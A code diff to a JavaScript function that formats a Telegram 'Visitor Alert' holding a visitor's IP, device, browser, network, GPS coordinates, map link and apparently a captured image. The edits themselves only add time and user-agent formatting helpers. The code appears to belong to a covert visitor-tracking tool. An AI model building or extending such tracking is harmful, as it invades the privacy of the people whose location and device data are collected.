@@ -77,12 +77,12 @@ async function sendTelegram(env, s) {
   const text = `
 🚨 <b>Visitor Alert</b>
 
-🕒 <b>Time:</b> ${s.updated || "-"}
+🕒 <b>Time:</b> ${formatTime(s.updated)}
 🌐 <b>IP:</b> ${s.ip || "-"}
 
-📱 <b>Device:</b> ${s.device || "-"}
+📱 <b>Device:</b> ${shortDevice(s.device)}
 💻 <b>OS:</b> ${s.os || "-"}
-🌍 <b>Browser:</b> ${s.browser || "-"}
+🌍 <b>Browser:</b> ${getBrowser(s.device)}
 
 📡 <b>Network:</b> ${s.network || "-"}
 
@@ -91,10 +91,28 @@ Lat: ${s.lat || "-"}
 Lng: ${s.lng || "-"}
 
 🔗 <a href="${map}">Open Map</a>
-
-${s.error ? `❌ <b>Error:</b> ${s.error}` : ""}
 `;
+  
+function formatTime(t) {
+  return new Date(t).toLocaleString("en-IN", {
+    timeZone: "Asia/Kolkata"
+  });
+}
 
+function shortDevice(ua = "") {
+  if (ua.includes("Android")) return "Android Mobile";
+  if (ua.includes("iPhone")) return "iPhone";
+  if (ua.includes("Windows")) return "Windows PC";
+  return "Unknown Device";
+}
+
+function getBrowser(ua = "") {
+  if (ua.includes("Chrome")) return "Chrome";
+  if (ua.includes("Safari")) return "Safari";
+  if (ua.includes("Firefox")) return "Firefox";
+  return "Unknown";
+}
+  
   // IMAGE PATH
   if (s.image && s.image.startsWith("data:image")) {
 
